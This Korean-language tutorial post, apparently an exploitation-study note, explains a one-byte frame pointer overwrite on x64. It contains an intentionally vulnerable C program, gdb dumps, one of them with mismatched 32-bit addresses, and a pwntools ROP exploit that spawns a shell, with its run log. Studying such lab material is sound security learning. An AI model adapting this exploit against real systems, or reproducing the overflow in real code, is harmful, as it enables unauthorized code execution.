---
title: Frame Pointer Overwrite - x64
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, frame pointer overwrite]
math: true
mermaid: true
---

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector -o fpo fpo.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
 
void vuln(){
    char buf[32];
    printf("buf[32] address : %p\n",buf);
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 49);
}
 
void main(int argc, char *argv[]){
    if(argc<2){
        printf("argv error\n");
        exit(0);
    }
    vuln();
}
```

buf는 32 byte지만 read를 49 byte하여 bof 발생한다.

```
0x7ffe119a28b0:	0x4141414141414141         0x4141414141414141
0x7ffe119a28c0:	0x4141414141414141         0x4141414141414141
0x7ffe119a28d0:	0x4141414141414141         0x4141414141414141
0x7ffe119a28e0:	0x00007ffe119a2942 <= rbp  0x000000000040079b 
0x7ffe119a28f0:	0x00007ffe119a29e8         0x0000000200000000
```

&buf+4(0xbfa07cfe)의 마지막 byte(0xfe)를 EBP의 마지막 바이트에 삽입한다.

```
gdb-peda$ x/24x $ebp
0xbfa07d02:	0x43434343	0x44444444	0x45454545	0x46464646
0xbfa07d12:	0x47474747	0x48484848	0x80ecb70a	0x0002b7d2
```

1 byte 오버플로를 통해 rbp 변경 확인한다.

```
gdb-peda$ x/24gx $rbp
0x7ffe119a2942:	0x29e0000000000040	0x000000007ffe119a
0x7ffe119a2952:	0x0000000000000000	0x2989000000000000
0x7ffe119a2962:	0x29894ef138aa26b6	0x00004ff63f51fb46
```

leave 명령으로 인해 rbp 레지스터 값은 rsp에 저장된다. 따라서 1 byte 변조하여 RTL 코드 또는 Shellcode가 저장된 영역을 가리키게 한다면 Shell 획득이 가능하다.

## Exploit code

```python
# Exploit Code
from pwn import *

p=process(['./fpo','a'])
buf = p.recvline()
libc = p.recvline()

onebyte = int(buf.split(' ')[3][12:14],16)
libcBase = int(libc.split(' ')[3],16) - 0x55800
system = libcBase + 0x45390
binsh = libcBase + 0x18cd57
exit = libcBase + 0x3a030
poprdi = 0x400803

print('one byte: '+hex(onebyte))
print('libcBase: '+hex(libcBase))
print('system(): '+hex(system))
print('/bin/sh: '+hex(binsh))
print('exit: '+hex(exit))
print('pop rdi: '+hex(poprdi))

exploit_code = "A"*8
exploit_code += p64(poprdi)
exploit_code += p64(binsh)
exploit_code += p64(system)
exploit_code += "A"*(48-len(exploit_code))
exploit_code += p64(onebyte)

p.sendline(exploit_code)

p.interactive()
```

## Exploit

```
pwner@bs-virtual-machine:~$ python exploit.py 
[+] Starting local process './fpo': pid 10373
one byte: 0x50
libcBase: 0x7fe3ad0be000
system(): 0x7fe3ad103390
/bin/sh: 0x7fe3ad24ad57
exit: 0x7fe3ad0f8030
pop rdi: 0x400803
[*] Switching to interactive mode
$ id
uid=1001(pwner) gid=1001(pwner) groups=1001(pwner)
```

## References

- [02.Frame Pointer Overwrite(One-byte Overflow) - x64](https://www.lazenca.net/display/TEC/02.Frame+Pointer+Overwrite(One-byte+Overflow)+-+x64)